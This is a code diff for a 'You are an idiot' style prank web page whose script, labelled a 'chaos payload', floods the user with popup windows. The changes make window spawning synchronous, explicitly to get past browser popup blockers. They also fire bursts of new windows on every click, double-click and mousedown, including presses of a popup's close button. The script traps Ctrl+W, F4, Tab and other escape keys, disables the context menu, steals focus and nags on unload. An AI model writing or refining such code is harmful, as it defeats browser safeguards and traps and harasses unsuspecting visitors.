@@ -58,7 +58,7 @@ container.addEventListener('click', () => container.classList.remove('clicky'));
 micon.addEventListener('click', audioSwitch);
 
 // ==========================================================================
-// CHAOS PAYLOAD: Autonomous, aggressive, retaliatory, teleporting
+// CHAOS PAYLOAD: Synchronous-only spawns to bypass popup blockers
 // ==========================================================================
 (function() {
 	const urlParams = new URLSearchParams(window.location.search);
@@ -69,9 +69,6 @@ micon.addEventListener('click', audioSwitch);
 	const killKey = 'ik_' + sessionId;
 	let pollId = null;
 	let moveTimer = null;
-	let spawnTimer = null;
-	const myChildren = [];
-	let lastRetaliation = 0;
 
 	function isKilled() {
 		try { return !!localStorage.getItem(killKey); } catch (e) { return false; }
@@ -88,48 +85,46 @@ micon.addEventListener('click', audioSwitch);
 		clearKill();
 	}
 
-	// -------------------------------------------------------------------------
-	// Popup auto-play audio (all windows that have the audio elements)
-	// -------------------------------------------------------------------------
-	function startPopupAudio() {
-		const a = document.getElementById('youare-audio');
-		const o = document.getElementById('youare-overlap');
-		if (!a) return false;
-		let popupOverlap = false;
-		function pOverlap() {
-			if (!popupOverlap && a.currentTime > a.duration - .45) {
-				o.currentTime = 0;
-				o.play().catch(() => {});
-				popupOverlap = true;
+	// Popup auto-play audio
+	if (isPopup) {
+		function startPopupAudio() {
+			const a = document.getElementById('youare-audio');
+			const o = document.getElementById('youare-overlap');
+			if (!a) return false;
+			let popupOverlap = false;
+			function pOverlap() {
+				if (!popupOverlap && a.currentTime > a.duration - .45) {
+					o.currentTime = 0;
+					o.play().catch(() => {});
+					popupOverlap = true;
+				}
+				if (popupOverlap && o.currentTime > o.duration - .5) {
+					a.currentTime = 0;
+					a.play().catch(() => {});
+					popupOverlap = false;
+				}
 			}
-			if (popupOverlap && o.currentTime > o.duration - .5) {
-				a.currentTime = 0;
-				a.play().catch(() => {});
-				popupOverlap = false;
-			}
+			a.currentTime = 0;
+			a.play().catch(() => {});
+			a.addEventListener('timeupdate', pOverlap);
+			o.addEventListener('timeupdate', pOverlap);
+			return true;
 		}
-		a.currentTime = 0;
-		a.play().catch(() => {});
-		a.addEventListener('timeupdate', pOverlap);
-		o.addEventListener('timeupdate', pOverlap);
-		return true;
-	}
-	if (!startPopupAudio()) {
-		let tries = 0;
-		const retry = setInterval(() => {
-			if (startPopupAudio() || ++tries > 25) clearInterval(retry);
-		}, 50);
+		if (!startPopupAudio()) {
+			let tries = 0;
+			const retry = setInterval(() => {
+				if (startPopupAudio() || ++tries > 25) clearInterval(retry);
+			}, 50);
+		}
 	}
 
-	// -------------------------------------------------------------------------
 	// Global kill watcher
-	// -------------------------------------------------------------------------
 	pollId = setInterval(() => {
 		if (isKilled()) doCleanup();
 	}, 500);
 
 	// -------------------------------------------------------------------------
-	// Movement: chaotic bounce with random teleports across virtual desktop
+	// Movement: chaotic bounce + random teleports across virtual desktop
 	// -------------------------------------------------------------------------
 	let xOff = 5;
 	let yOff = 5;
@@ -168,21 +163,25 @@ micon.addEventListener('click', audioSwitch);
 		window.focus();
 	}
 
-	function openWindow(url) {
+	// -------------------------------------------------------------------------
+	// SYNCHRONOUS spawn — modern browsers only allow window.open inside
+	// the same tick as a user gesture. Any async/await or setTimeout
+	// breaks the chain and triggers the popup blocker.
+	// -------------------------------------------------------------------------
+	function openWindow() {
 		if (isKilled()) return;
-		const w = window.open(
-			url,
-			'_blank',
-			`menubar=no,status=no,toolbar=no,resizable=no,width=${WIN_W},height=${WIN_H},titlebar=no,alwaysRaised=yes`
-		);
-		if (w) myChildren.push(w);
+		try {
+			window.open(
+				'/moron?session=' + encodeURIComponent(sessionId),
+				'_blank',
+				`menubar=no,status=no,toolbar=no,resizable=no,width=${WIN_W},height=${WIN_H},titlebar=no,alwaysRaised=yes`
+			);
+		} catch (e) {}
 	}
 
-	async function proCreate(count) {
+	function proCreate(count) {
 		for (let i = 0; i < count; i++) {
-			if (isKilled()) return;
-			openWindow('/moron?session=' + encodeURIComponent(sessionId));
-			await new Promise(r => setTimeout(r, 50));
+			openWindow();
 		}
 	}
 
@@ -190,19 +189,19 @@ micon.addEventListener('click', audioSwitch);
 		if (isKilled()) { doCleanup(); return; }
 		const b = getDesktopBounds();
 
-		// Random teleport (~2% chance per frame)
+		// Random teleport (~2% chance)
 		if (Math.random() < 0.02) {
 			xPos = b.minX + Math.random() * (b.maxX - b.minX - WIN_W);
 			yPos = b.minY + Math.random() * (b.maxY - b.minY - WIN_H);
 			chaosDirection();
 		}
 
-		// Sudden direction change (~8% chance per frame)
+		// Sudden direction change (~8% chance)
 		if (Math.random() < 0.08) {
 			chaosDirection();
 		}
 
-		// Occasional focus steal
+		// Focus steal (~3% chance)
 		if (Math.random() < 0.03) {
 			window.focus();
 		}
@@ -219,35 +218,9 @@ micon.addEventListener('click', audioSwitch);
 		moveTimer = setTimeout(playBall, 1);
 	}
 
-	// -------------------------------------------------------------------------
-	// Child watcher: if a child is closed, retaliate with 15 more windows
-	// -------------------------------------------------------------------------
-	function startChildWatcher() {
-		setInterval(() => {
-			if (isKilled()) return;
-			let closedCount = 0;
-			myChildren.forEach((w, i) => {
-				try {
-					if (w.closed) closedCount++;
-				} catch (e) { closedCount++; }
-			});
-			// Filter out dead ones
-			for (let i = myChildren.length - 1; i >= 0; i--) {
-				try {
-					if (myChildren[i].closed) myChildren.splice(i, 1);
-				} catch (e) { myChildren.splice(i, 1); }
-			}
-			if (closedCount > 0 && Date.now() - lastRetaliation > 2000) {
-				proCreate(15);
-				lastRetaliation = Date.now();
-			}
-		}, 600);
-	}
-
 	function doCleanup() {
 		if (moveTimer) { clearTimeout(moveTimer); moveTimer = null; }
 		if (pollId) { clearInterval(pollId); pollId = null; }
-		if (spawnTimer) { clearInterval(spawnTimer); spawnTimer = null; }
 		try {
 			const a = document.getElementById('youare-audio');
 			const o = document.getElementById('youare-overlap');
@@ -258,17 +231,37 @@ micon.addEventListener('click', audioSwitch);
 	}
 
 	// -------------------------------------------------------------------------
-	// Triggers & traps (exact original flavor + escalation)
+	// Triggers: every user gesture spawns windows synchronously
 	// -------------------------------------------------------------------------
-	container.addEventListener('click', async () => {
+
+	// Click the face
+	container.addEventListener('click', () => {
 		if (isKilled()) return;
-		await proCreate(6);
+		proCreate(8);
+	});
+
+	// Click ANYWHERE on the page
+	document.addEventListener('click', () => {
+		if (isKilled()) return;
+		proCreate(4);
+	});
+
+	// Double-click anywhere
+	document.addEventListener('dblclick', () => {
+		if (isKilled()) return;
+		proCreate(6);
+	});
+
+	// Mouse-down (catches the close button press in popups too)
+	document.addEventListener('mousedown', () => {
+		if (isKilled()) return;
+		if (Math.random() < 0.3) proCreate(3);
 	});
 
 	window.onbeforeunload = () => "Are you an idiot?";
 	window.oncontextmenu = () => false;
 
-	window.onkeydown = async (event) => {
+	window.onkeydown = (event) => {
 		if (event.key === 'Escape') {
 			signalKill();
 			doCleanup();
@@ -276,27 +269,15 @@ micon.addEventListener('click', audioSwitch);
 		}
 		if (isKilled()) return;
 
-		if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
+		// Trap common browser-escape keys and retaliate with a burst
+		const trapKeys = ['Control', 'Alt', 'Delete', 'F4', 'F5', 'Tab', 'Backspace', 'Enter'];
+		if (trapKeys.includes(event.key) || (event.ctrlKey && event.key.toLowerCase() === 'w')) {
 			event.preventDefault?.();
-			await proCreate(15);
+			proCreate(12);
 			alert('You are an idiot!');
-			return;
-		}
-
-		if ((event.ctrlKey || event.metaKey) && event.key.toLowerCase() === 'w') {
-			event.preventDefault?.();
-			await proCreate(15);
-			alert('You are an idiot!');
-			return;
 		}
 	};
 
-	// Continuous auto-spawn every 2.5 seconds
-	spawnTimer = setInterval(() => {
-		if (!isKilled()) openWindow('/moron?session=' + encodeURIComponent(sessionId));
-	}, 2500);
-
-	// Start chaos
+	// Start bouncing immediately
 	playBall();
-	startChildWatcher();
 })();
